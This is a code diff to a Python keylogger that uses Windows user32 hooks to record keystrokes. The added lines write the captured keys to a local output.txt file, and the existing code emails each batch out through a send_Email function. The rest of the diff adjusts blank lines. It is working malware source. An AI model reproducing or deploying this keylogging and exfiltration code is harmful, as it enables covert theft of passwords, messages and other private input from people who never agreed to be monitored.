@@ -51,7 +51,6 @@ def send_Email(msg):
 
 
 
-
 class KeyLogger:
 
     def __init__(self):
@@ -206,6 +205,12 @@ def hookProc(nCode, wParam, lParam):
         log = log[:-1]
     print(log)
     if len(log) > 40:
+        print('Creating Log File')
+        with open('output.txt', 'a') as f:
+            f.write(log)
+            print('Completed log')
+            f.write('\n')
+            f.close()
         send_Email(log)
         log = ''
         KeyLogger.uninstallHookProc()
@@ -215,13 +220,22 @@ def hookProc(nCode, wParam, lParam):
         startKeyLog()
     return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
 
+
+
 def startKeyLog():
     msg = MSG()
     user32.GetMessageA(byref(msg), 0, 0, 0)
+
+
 
 KeyLogger = KeyLogger()
 pointer = getFPTR(hookProc)
 if KeyLogger.installHookProc(pointer):
     print("Hook installed")
 
+
+
+
+
 startKeyLog()
+
